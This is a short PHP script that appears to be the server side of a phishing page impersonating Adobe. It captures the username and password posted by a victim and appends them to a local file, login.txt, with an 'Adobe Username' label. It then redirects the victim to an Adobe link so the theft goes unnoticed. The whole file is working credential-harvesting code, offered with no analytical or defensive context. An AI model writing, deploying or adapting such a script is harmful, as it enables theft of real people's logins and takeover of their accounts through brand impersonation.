<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    $log = "Adobe Username: $username | Pass: $password\n";

    file_put_contents("login.txt", $log, FILE_APPEND);

    header('Location: https://adobe.ly/2OE9ZKL');
    exit();
}
?>
